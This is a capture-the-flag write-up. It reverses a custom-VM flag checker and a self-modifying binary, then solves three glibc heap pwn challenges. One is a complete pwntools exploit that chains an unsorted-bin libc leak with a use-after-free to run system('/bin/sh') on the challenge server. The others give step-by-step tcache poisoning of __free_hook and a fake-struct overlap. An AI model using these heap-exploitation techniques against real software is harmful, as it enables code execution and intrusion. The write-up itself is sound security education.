## masterkey
- Category: Reverse
- Difficulty: easy
- Topic: Custom VM
### Solution

The challenge is basically reversing of custom VM logic. The binary is x86-64 ELF.

```
> file masterkey
masterkey: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=76aa54cde5e45d7e620a1e0898773f2abeed8bac, for GNU/Linux 3.2.0, stripped
```

and the challenge consists of only a `main` function as flag checker.

```c
__int64 __fastcall main(int a1, char **argv, char **argc)
{
  // ...
  if ( a1 != 2 )
  {
    __fprintf_chk(stderr, 2, "usage: %s <flag>\n", *argv);
    return 2;
  }
  flag = argv[1];
  if ( strlen(flag) != 53 )
    goto LABEL_20;
  inst = (unsigned __int8 *)&unk_2040;
  v5 = 1;
  reg[0] = 0;
  while ( 1 )
  {
    byteA = *inst;                              // opcode
    byteB = inst[1];                            // reg1
    byteC = inst[2];                            // reg2 / imm
    if ( *inst == 0x7A )
    {
      *((_BYTE *)reg + byteB) ^= byteC;         // 0x7A: reg1 ^= imm
      goto LABEL_17;
    }
    if ( byteA > 0x7Au )
      break;
    if ( byteA == 0x4E )
    {
      *((_BYTE *)reg + byteB) ^= *((_BYTE *)reg + byteC); // 0x4E: reg1 ^= reg2
    }
    else if ( byteA > 0x4Eu )
    {
      if ( byteA != 0x6D )
        goto LABEL_20;
      *((_BYTE *)reg + byteB) += *((_BYTE *)reg + byteC); // 0x6D: reg1 += reg2
    }
    else if ( byteA == 0x1D )
    {
      *((_BYTE *)reg + byteB) *= (_BYTE)byteC;            // 0x1D: reg1 *= imm
    }
    else
    {
      if ( byteA != 0x24 )
        goto LABEL_20;
      *((_BYTE *)reg + byteB) += byteC;                   // 0x24: reg1 += imm
    }
LABEL_17:
    inst += 3;
  }
  if ( byteA == 0xB2 )
  {
    *((_BYTE *)reg + byteB) = __ROL1__(*((_BYTE *)reg + byteB), byteC); // 0xB2: reg1 = ROL(reg1, imm)
    goto LABEL_17;
  }
  if ( byteA <= 0xB2u )
  {
    if ( byteA == 0x91 )
    {
      *((_BYTE *)reg + byteB) = flag[byteC];               // 0x91: reg1 = flag[imm]
    }
    else
    {
      if ( byteA != 0xA7 )
        goto LABEL_20;
      if ( (_BYTE)byteC != *((_BYTE *)reg + byteB) )      // 0xA7: if (reg1 != imm) v5 = 0
        v5 = 0;
    }
    goto LABEL_17;
  }
  if ( byteA == 0xE0 && v5 )                              // 0xE0: HALT / check success
  {
    puts("Correct! That's the master key.");
    return 0;
  }
  else
  {
LABEL_20:
    puts("Wrong.");
    return 1;
  }
}
```

The loop itself is quite messy and some of the opcode (`byteA`) fell outside the loop itself, but we can clearly see the instruction format being three byte per instruction, with first byte being opcode and the last two bytes being either both index to an array of registers, or pair of a register & an immediate. The custom VM code lives in `unk_2040` and can be easily retrieved via `pwntools`.

We can approach it with `z3` where we add constraint for each opcode `0xA7`.

```python
from z3 import BitVec, BitVecVal, RotateLeft, Solver, sat
from pwn import *

elf = ELF("./masterkey")
bytecode_addr = 0x2040

# Read until opcode 0xE0 (HALT)
bytecode = bytearray()
while True:
    chunk = elf.read(bytecode_addr + len(bytecode), 3)
    bytecode.extend(chunk)
    if chunk[0] == 0xE0:
        break

code = bytes(bytecode)
solver = Solver()
FLAG_LEN = 53
flag = [BitVec(f"flag_{i}", 8) for i in range(FLAG_LEN)]



# first 5 bytes csaw{ 
for i, c in enumerate(b"csaw{"):
    solver.add(flag[i] == c)

solver.add(flag[-1] == ord("}"))

# printable ascii
for b in flag[5:-1]:
    solver.add(b >= 0x20, b <= 0x7E)

regs = [BitVecVal(0, 8) for _ in range(8)]

ip = 0
while ip < len(code):
    op = code[ip]
    arg1 = code[ip + 1]
    arg2 = code[ip + 2]
    ip += 3

    if op == 0xE0:  # HALT
        break
    elif op == 0x7A:  # XOR reg, imm
        regs[arg1] = regs[arg1] ^ BitVecVal(arg2, 8)
    elif op == 0x4E:  # XOR reg, reg
        regs[arg1] = regs[arg1] ^ regs[arg2]
    elif op == 0x6D:  # ADD reg, reg
        regs[arg1] = regs[arg1] + regs[arg2]
    elif op == 0x24:  # ADD reg, imm
        regs[arg1] = regs[arg1] + BitVecVal(arg2, 8)
    elif op == 0x1D:  # MUL reg, imm
        regs[arg1] = regs[arg1] * BitVecVal(arg2, 8)
    elif op == 0xB2:  # ROL reg, imm
        regs[arg1] = RotateLeft(regs[arg1], arg2)
    elif op == 0x91:  # LOAD reg, flag[imm]
        regs[arg1] = flag[arg2]
    elif op == 0xA7:  # CMP reg, imm 
        solver.add(regs[arg1] == BitVecVal(arg2, 8))
    else:
        raise ValueError(f"unknown")

if solver.check() == sat:
    model = solver.model()
    recovered = "".join(chr(model[flag[i]].as_long()) for i in range(FLAG_LEN))
    success(f"Flag found: {recovered}")
else:
    error("Unsatisfiable constraints")
```


## Autobahn
- Category: Reverse
- Difficulty: Very easy
- Topic: Self-Modifying Code 
### Solution

A single `main` as flag checker again, but this time it looks kind of funny.
 
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 addr; // [rsp+18h] [rbp-28h]
  unsigned __int64 i; // [rsp+38h] [rbp-8h]

  if ( argc == 2 )
  {
    addr = (unsigned __int64)&_start_enccode & -sysconf(30);
    if ( mprotect((void *)addr, (size_t)&_stop_enccode[-addr], 7) )
    {
      perror("mprotect");
      return 3;
    }
    else
    {
      for ( i = 0; i < _stop_enccode - (char *)&_start_enccode; ++i )
        *((_BYTE *)&_start_enccode + i) ^= smc_key_0[i & 7];
      ((void (__fastcall *)(const char *))_start_enccode)(argv[1]);
      return 0;
    }
  }
  else
  {
    fprintf(_bss_start, "usage: %s <password>\n", *argv);
    return 2;
  }
}
```

`addr` is `&_start_enccode` rounded down to the nearest page boundary (`30 == [_SC_PAGESIZE](https://elixir.bootlin.com/glibc/glibc-2.18.90/C/ident/_SC_PAGESIZE)`)
The `mprotect` line mark the region `mem[addr:_stop_enccode]` as RWX and then it decrypts the code it is to execute in runtime via static key `smc_key_0` (circular XOR) and then run on the decrypted code. We can decrypt it and write it to a new ELF for analysis.

```python
from pwn import *

elf = ELF("./nitro", checksec=False)

start = elf.symbols["_start_enccode"]
stop = elf.symbols["_stop_enccode"]
key = elf.read(elf.symbols["smc_key_0"], 8)

size = stop - start
enc = elf.read(start, size)
dec = bytes(b ^ key[i & 7] for i, b in enumerate(enc))

print(f"entry: {hex(start)}")

new_elf = ELF("./nitro", checksec=False)
new_elf.write(start, dec)
new_elf.save("./nitro_stage2")
```

This time the function entry disassembled cleanly.

## Diamond Dogs
- Category: Pwn
- Difficulty: Easy
- Topic: UAF

### Solution
We're given the challenge binary plus a 2.31 libc library file.

```
> file guard-dog
guard-dog: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.31.so, for GNU/Linux 3.2.0, BuildID[sha1]=e57b1a8b83b5c9aaaccf87833d5ac1bbf05c1f1f, not stripped
> ls .
Dockerfile  guard-dog  ld-2.31.so  libc-2.31.so
```

Immediately looks like a heap challenge.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  // ...
  while ( 1 )
  {
    puts("");
    puts("=== K-9 Unit Manager ===");
    puts("1) adopt dog");
    puts("2) command dog");
    puts("3) release dog");
    puts("4) file note");
    puts("5) read note");
    puts("6) shred note");
    puts("7) go home");
    __printf_chk(1, "> ");
    flush();
    switch ( read_long() )
    {
      // ...
    }

```

Option 2 looks especially interesting. It takes i-th dog from a list of dogs, and calls the function it have on the struct offset 24.

```c
case 2LL:
	__printf_chk(1, "kennel: ");
	flush();
	v7 = read_long();
	if ( v7 > 7 )
	  goto LABEL_13;
	v8 = (__int64)*(&dogs + v7);

	  goto LABEL_13;
	(*(void (__fastcall **)(__int64))(v8 + 24))(v8);

```

The allocation of the dog struct shows us that the first 24 bytes are the name of the dog, and the function on offset is initially set as `woof`. This convenient setup allows a simple primitive to set the dog's name as `/bin/sh` and use arbitrary chunk allocation to set the function as `system`. 

```c
case 1LL:
	__printf_chk(1, "kennel (0-%d): ", 7);
	flush();
	v3 = read_long();
	v4 = v3;
	if ( v3 > 7 )
	{

	  continue;

	*(&dogs + v4) = v6;

```

This is one way, the other way is simpler by using UAF of  `release dog` + `command dog` where you can claim the chunk from tcache using `file note` which allows you to allocate chunk of any size, then poison both the name/function field of a released dog, then call `command dog` on it.

However, no matter the path we take, given the PIE of `libc-2.31.so` we'll need to leak libc base somehow. One simple ways is to `puts(puts)` because conveniently there's no PIE.

but if you don't wanna risk doing arbitrary chunk twice, instead we can also do an [unsorted bin leak](https://ctf-wiki.org/zh-tw/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/#leak) and get `&main_arena` (`fd` of the lone bin inside `unsorted bin` points to `main_arena`) Though the offset of `__malloc_hook + 0x10` for `main_arena` was incorrect in my case, for me it was `0x70`. 

Anyways, here are roughly the steps:
- libc leak via unsorted bin
	- file note with size big enough like `0x500` and a smaller one `0x20`
	- free the `0x500` note as it is big enough and not adjacent to top chunk due to the `0x20` chunk, it is now the sole chunk in unsorted bin with its `bin->fd = &main_arena`
	- read that note to leak `main_arena` in `leak[:8]` and `libc.address = p64(leak[:8]) - (libc.sym["__malloc_hook"] + 0x70)`
- chunk reuse
	- adopt a dog and immediately free it, a chunk is now in tcache `0x20` bin
	- file note of size `0x20` to claim it, and write `/bin/sh` padded to 24 bytes followed by `p64(system)`
	- trigger UAF by calling `command dog` on the dog you just freed

With UAF, the shell is achieved.


### Exploit/Flag

```python
from pwn import *
context.arch = "amd64"
elf = ELF("./guard-dog")
libc = ELF("./libc-2.31.so")

# p = process(elf.path)
p = remote('10.0.171.148', 1025)

def adopt_dog(p, id: str, name: str):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"kennel (0-7): ", id.encode())
    p.sendlineafter(b"name: ", name.encode())

def command_dog(p, id: str):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"kennel: ", id.encode())
    p.interactive()

def free_dog(p, id: str):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"kennel: ", id.encode())
    p.recvuntil(b"wild")

def file_note(p, id: str, size: int, contents: bytes):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"note slot (0-7): ", id.encode())
    p.sendlineafter(b"size: ", str(size).encode())  
    p.sendlineafter(b"contents: ", contents)

def read_note(p, id: str):
    p.sendlineafter(b"> ", b"5")
    p.sendlineafter(b"note slot: ", id.encode())
    p.recvuntil(b"contents: ")
    return p.recvline().strip()

def shred_note(p, id: str):
    p.sendlineafter(b"> ", b"6")
    p.sendlineafter(b"note slot: ", id.encode())
    p.recvuntil(b"shredded")

# leak libc
file_note(p, "0", 0x500, b"A"*0x500)
file_note(p, "1", 0x20, b"B"*0x20)
shred_note(p, "0") # note 0 in unsorted bin
read_note(p, "0") # leak libc address
leak = u64(read_note(p, "0")[0:8].ljust(8, b"\x00"))
main_arena = libc.sym["__malloc_hook"] + 0x70 
libc.address = leak - main_arena
success(f"libc base: {hex(libc.address)}")
system = libc.sym["system"]

# fake chunk system("/bin/sh")
adopt_dog(p, "0", "A"*0x20)
free_dog(p, "0") # free dog 0
payload = b"/bin/sh\x00".ljust(24, b"\x00") + p64(libc.sym["system"])
file_note(p, "3", 0x20, payload) 
command_dog(p, "0") 
```

## Hell Bells
- Category: Pwn
- Difficulty: Easy
- Topic: UAF
### Solution
It turns out all three Pwn challenges handed out during the competition were all basic heap exploitation (which was a bit underwhelming in my opinion) Anyways, the binary for this one is the same architecture and libc version, so the idea is similar overall.

This time we're given the following options:
```
given slot[16]
1 -> set slot[i] to chunk from malloc(size)
2 -> free(slot[i]) but slot[i] is not zeroed
3 -> change the chunk content pointed by slot[i]
4 -> write the chunk content pointed by slot[i]
```

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  // ...
  while ( 1 )
  {
    puts("");
    puts("=== Thermite Charge Inventory ===");
    puts("1) plant charge");
    puts("2) defuse charge");
    puts("3) rewire charge");
    puts("4) inspect charge");
    puts("5) leave");
    __printf_chk(1, "> ");
    flush();
    switch ( read_long() )
    {
      case 1LL:
        __printf_chk(1, "slot (0-%d): ", 15);
        flush();
        v3 = read_long();
        v4 = v3;
        if ( v3 > 0xF )
          goto LABEL_22;
        if ( *((_QWORD *)&charges + v3) )
        {
          puts("slot occupied");
        }
        else
        {
          __printf_chk(1, "size: ");
          flush();
          v5 = read_long();
          if ( v5 - 1 > 0xFFF )
          {
            puts("bad size");
          }
          else
          {
            v6 = malloc(v5);
            if ( v6 )
            {
              __printf_chk(1, "payload: ");
              flush();
              read_n(v6, v5);
              *((_QWORD *)&charges + v4) = v6;
              sizes[v4] = v5;
              __printf_chk(1, "charge planted in slot %ld\n", v4);
            }
            else
            {
              puts("out of thermite");
            }
          }
        }
        break;
      case 2LL:
        __printf_chk(1, "slot: ");
        flush();
        v7 = read_long();
        if ( v7 > 0xF )
          goto LABEL_22;
        v8 = (void *)*((_QWORD *)&charges + v7);
        if ( !v8 )
          goto LABEL_22;
        free(v8);
        puts("charge defused");
        break;
      case 3LL:
        __printf_chk(1, "slot: ");
        flush();
        v9 = read_long();
        v10 = v9;
        if ( v9 > 0xF || !*((_QWORD *)&charges + v9) )
          goto LABEL_22;
        __printf_chk(1, "new payload: ");
        flush();
        read_n(*((_QWORD *)&charges + v10), sizes[v10]);
        puts("charge rewired");
        break;
      case 4LL:
        __printf_chk(1, "slot: ");
        flush();
        v11 = read_long();
        v12 = v11;
        if ( v11 <= 0xF && *((_QWORD *)&charges + v11) )
        {
          __printf_chk(1, "payload: ");
          write(1, *((const void **)&charges + v12), sizes[v12]);
          puts("");
        }
        else
        {
LABEL_22:
          puts("bad slot");
        }
        break;
      case 5LL:
        puts("boom.");
        return 0;
      default:
        puts("no such option");
        break;
    }
  }
}
```

The bug is in `defuse charge`. It frees `charges[i]` but never sets it back to `NULL`, and `sizes[i]` stays too. So `rewire charge` and `inspect charge` still happily work on a freed chunk, which gives us both a UAF read and a UAF write.

The leak can be achieved in the same way as Diamond Dogs by utilizing the unsorted bin UAF + `inspect charge`. For the attack target here, since unlike Diamond Dogs there is no option that does direct function calls, we'll need another target. This binary also has Full RELRO and PIE (see the checksec in the output below) so overwriting GOT is out too. Luckily under this version we still have `__free_hook` available. Whatever function pointer sits in `__free_hook` gets called by `free(ptr)` with `ptr` as its argument, so if we put `system` there then freeing a chunk containing `/bin/sh` is the same as `system("/bin/sh")`.

To get a chunk on top of `__free_hook` we use [tcache poisoning](https://ctf-wiki.org/zh-tw/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/#tcache-poisoning). A freed chunk in tcache keeps the pointer to the next free chunk (`fd`) in its first 8 bytes, and since we can still write to freed chunks we can just point it somewhere else. Then malloc will happily hand that address back to us as if it was a normal chunk. There's no safe-linking in 2.31 (that came in 2.32) so we can write the raw address without any mangling.

One thing to watch out for, tcache keeps a count of how many chunks are in each bin and malloc won't take from the bin once the count hits 0. If we only free one chunk and poison it, the count is 1, the first malloc gets our chunk back and the second one never comes from tcache. So we free two chunks to make the count 2.

Anyways, here are roughly the steps:
- libc leak via unsorted bin
	- plant charge of size `0x500` in slot 0 and a small `0x20` one in slot 1 so slot 0 is not adjacent to top chunk
	- defuse slot 0, it is now the sole chunk in unsorted bin with its `fd = &main_arena`
	- inspect slot 0 to leak `main_arena` in `leak[:8]` and `libc.address = leak - (libc.sym["__malloc_hook"] + 0x70)`, same offset as Diamond Dogs
- tcache poisoning
	- plant two `0x20` charges in slot 2 and 3 and defuse both, now `tcache[0x30] = chunk 3 -> chunk 2`
	- rewire slot 3 and write `&__free_hook` into its `fd`, now `tcache[0x30] = chunk 3 -> __free_hook`
	- plant a `0x20` charge to take chunk 3 back out
	- plant another `0x20` charge, this one lands on `__free_hook` so its payload `p64(system)` is written right into it
- trigger
	- plant a charge with `/bin/sh\x00` and defuse it, `free` calls `__free_hook` which is now `system`

A small gotcha with `read_n`, it keeps reading until it gets exactly `size` bytes. `sendlineafter` adds a `\n` at the end, so when rewiring a `0x20` chunk I send `0x1f` bytes and let the newline be the last byte. Same reason the last charge has size 9, `/bin/sh\x00` is 8 bytes and the newline is the 9th.

## Saint Vespers
- Category: Pwn
- Difficulty: Easy
- Topic: UAF

### Solution
The last heap one, and this time we're given the source `vespers.c` together with the binary and a 2.35 libc.

```
> file vespers
vespers: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.35.so, for GNU/Linux 3.2.0, stripped
> strings libc.so.6 | grep "GNU C Library"
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.14) stable release version 2.35.
```

The newer libc matters a lot here. `__free_hook` and `__malloc_hook` are no longer called by malloc/free since 2.34 (the symbols are still there but writing to them does nothing), and tcache `fd` pointers are mangled with safe-linking since 2.32. So the Hell Bells route is dead and we'd need a heap leak just to do tcache poisoning. Luckily we don't need any of that, because just like Diamond Dogs the struct itself has a function pointer in it.

```c
typedef struct chorister {
    char   name[NAME_SIZE];         // 0x00, NAME_SIZE = 0x38
    void (*sing)(struct chorister *self); // 0x38
    char  *transcript;              // 0x40
    size_t transcript_len;          // 0x48
    int    active;                  // 0x50
} chorister_t;
```

`sizeof(chorister_t)` is `0x58`, so every chorister lives in a `0x60` chunk. And `Begin the Final Performance` calls `sing` on every active chorister with the struct itself as the argument.

```c
static void op_perform(void) {
    puts("=== The Final Performance begins ===");
    for (int i = 0; i < MAX_CHOIR; i++) {
        if (choir[i] && choir[i]->active)
            choir[i]->sing(choir[i]);
    }
    puts("=== The choir falls silent ===");
}
```

So if we control a chorister struct, setting `name` to `/bin/sh` and `sing` to `system` gives us `system("/bin/sh")`. The bug that lets us do that is in `op_retire`:

```c
static void op_retire(void) {
    // ...
    chorister_t *c = choir[idx];
    if (!c->active) { puts("That chorister is already in the archive."); return; }

    if (c->transcript) free(c->transcript);
    free(c);
    c->active = 0;  // writes into the chunk it just freed

    printf("Seat %ld retired to the archive.\n", idx);
}
```

It frees the struct but `choir[idx]` is never cleared, and `op_restore` just flips `active` back to 1 with no other checks. So a retired then restored chorister is a fully working UAF, all the other options will use it like nothing happened.

The libc leak is the same unsorted bin trick again. Recruit a chorister with a `0x420` transcript (a `0x430` chunk, too big for tcache which tops out at `0x410`) and a second one after it so it is not adjacent to top chunk. Retire the first one and its transcript goes into unsorted bin. Then restore it and recite it, which `write`s the freed transcript out and its first 8 bytes is `fd = &main_arena + 0x60`.

Why does recite still work on a freed struct? When a chunk goes into tcache, only the first 16 bytes get overwritten (the `next` pointer and the tcache `key`), which is all inside `name`. `transcript` at `0x40` and `transcript_len` at `0x48` are untouched, so it still points to the old transcript.

For the `0x60` chunk, the trick is that transcript length is up to us. If we ask for a transcript of `0x58` bytes it comes from the same `tcache[0x60]` bin as the structs. So a new chorister can get an old freed struct back as its transcript, and then we write the whole struct with the transcript content.

Anyways, here are roughly the steps:
- libc leak via unsorted bin
	- recruit A with transcript length `0x420` and B with transcript length `0x20`
	- retire A, its transcript goes into unsorted bin and its struct into `tcache[0x60]`
	- restore A (`active = 1` again) and recite it to leak `main_arena`, `libc.address = leak - 0x21ace0`
- struct overlap
	- retire B, now `tcache[0x60] = B -> A` (B's transcript goes to `tcache[0x30]`, we don't care about it)
	- recruit C with transcript length `0x58`. The struct of C takes B's old chunk and the transcript of C takes A's old chunk
	- the transcript we write is a fake struct, `/bin/sh\x00` padded to `0x38`, then `system`, then `transcript = 0`, `transcript_len = 0`, `active = 1`
- trigger
	- `choir[0]` still points to A's old chunk which is now our fake struct, so `Begin the Final Performance` calls `system("/bin/sh")`

```
0x00  name            "/bin/sh\x00" + padding
0x38  sing            system
0x40  transcript      0
0x48  transcript_len  0
0x50  active          1
```

Since we never touch a tcache `fd` pointer, safe-linking never comes into play and no heap leak is needed.
